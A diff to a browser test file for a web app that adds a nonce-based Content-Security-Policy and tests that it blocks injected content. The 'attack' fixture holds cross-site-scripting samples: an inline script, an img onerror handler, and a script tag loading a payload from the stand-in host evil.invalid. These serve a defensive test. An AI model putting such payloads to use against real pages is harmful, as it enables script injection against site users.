@@ -22,7 +22,8 @@ function renderAssets(html, provider) {
   return html.replace(/{% if layout.uses_maplibre\(\) %}([\s\S]*?){% endif %}/g, (_, block) => {
     const branches = block.split(/{% else if layout.uses_(?:mapbox|google_maps)\(\) %}/);
     return branches[{ maplibre: 0, mapbox: 1, google: 2 }[provider]] || '';
-  }).replace(/{{ layout.asset\("([^"]+)"\) }}/g, '/static/$1');
+  }).replace(/{{ layout.asset\("([^"]+)"\) }}/g, '/static/$1')
+    .replace(/{{ layout.csp_nonce }}/g, 'test-nonce');
 }
 
 async function pageHtml(kind, provider) {
@@ -38,6 +39,11 @@ async function pageHtml(kind, provider) {
     content = markup;
     const html = await source('templates/pages/' + template + '.html');
     assets = renderAssets(html.split('{% block scripts %}')[1].split('{% endblock %}')[0], provider);
+  }
+  if (kind === 'attack') {
+    content = '<script>window.injectedScriptRan=true</script>' +
+      '<img src=x onerror="window.injectedHandlerRan=true">' +
+      '<template data-map-assets><script src="https://evil.invalid/payload.js"></script></template>';
   }
   return '<!DOCTYPE html><html><head><title>' + kind + '</title>' +
     '<link rel="stylesheet" href="/static/css/app.css">' + scripts +
@@ -83,6 +89,10 @@ before(async () => {
           return res.end(providerStub);
         }
         if (/vendor\/map(lib|box).*\.js$/.test(path)) {
+          if (url.searchParams.has('actual')) {
+            res.setHeader('Content-Type', 'text/javascript');
+            return res.end(await source('web/' + path));
+          }
           await new Promise(r => setTimeout(r, 250));
           res.setHeader('Content-Type', 'text/javascript');
           return res.end('window.testSdk = true;');
@@ -92,7 +102,19 @@ before(async () => {
       }
       const [, kind = 'plain', provider = 'google'] = url.pathname.split('/');
       res.setHeader('Content-Type', 'text/html');
-      res.end(await pageHtml(kind, provider));
+      res.setHeader('Content-Security-Policy', "script-src 'nonce-test-nonce' 'strict-dynamic'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; worker-src 'self' blob:; object-src 'none'");
+      if (kind === 'sdk') {
+        const global = provider === 'mapbox' ? 'mapboxgl' : 'maplibregl';
+        return res.end('<!doctype html><div id="map" style="width:200px;height:200px"></div>' +
+          '<script nonce="test-nonce" src="/static/vendor/' + provider + '-gl.js?actual=1"></script>' +
+          '<script nonce="test-nonce">var sdk=' + global + ';' +
+          (provider === 'mapbox' ? 'sdk.accessToken="";' : '') +
+          'window.actualMap=new sdk.Map({container:"map",style:{version:8,sources:{},layers:[]},center:[0,0],zoom:1,attributionControl:false});' +
+          'window.actualMap.on("load",function(){window.sdkReady=true})</script>');
+      }
+      const html = (await pageHtml(kind, provider))
+        .replace(/<script(?=\s+defer)/g, '<script nonce="test-nonce"');
+      res.end(html);
     } catch (error) {
       res.statusCode = 500;
       res.end(String(error));
@@ -205,6 +227,38 @@ test('pinned htmx network-restores without a localStorage history snapshot', asy
   assert.equal(await page.evaluate(() => localStorage.getItem('htmx-history-cache')), null);
   await page.close();
 });
+
+test('enforced candidate runs trusted scripts but rejects swapped script gadgets', async () => {
+  const page = await browser.newPage();
+  let externalRequested = false;
+  await page.route('https://evil.invalid/**', route => {
+    externalRequested = true;
+    return route.abort();
+  });
+  await page.goto(origin + '/plain/google');
+  assert.equal(await page.evaluate(() => typeof htmx), 'object');
+  await page.evaluate(() => htmx.ajax('GET', '/attack/google', { target: '#content' }));
+  await page.waitForFunction(() => document.querySelector('h1')?.textContent === 'attack');
+  assert.equal(await page.evaluate(() => window.injectedScriptRan), undefined);
+  assert.equal(await page.evaluate(() => window.injectedHandlerRan), undefined);
+  assert.equal(externalRequested, false);
+  await page.close();
+});
+
+for (const provider of ['maplibre', 'mapbox']) {
+  test(provider + ': actual vendored SDK constructs and loads a local empty map under CSP', async () => {
+    const page = await browser.newPage();
+    const violations = [];
+    page.on('console', message => {
+      if (message.text().includes('Content Security Policy')) violations.push(message.text());
+    });
+    await page.goto(origin + '/sdk/' + provider);
+    await page.waitForFunction(() => window.sdkReady === true);
+    assert.equal(await page.evaluate(() => !!window.actualMap.getCanvas()), true);
+    assert.deepEqual(violations, []);
+    await page.close();
+  });
+}
 
 test('fragment morphs retain Alpine visibility and remain interactive', async () => {
   const page = await browser.newPage();
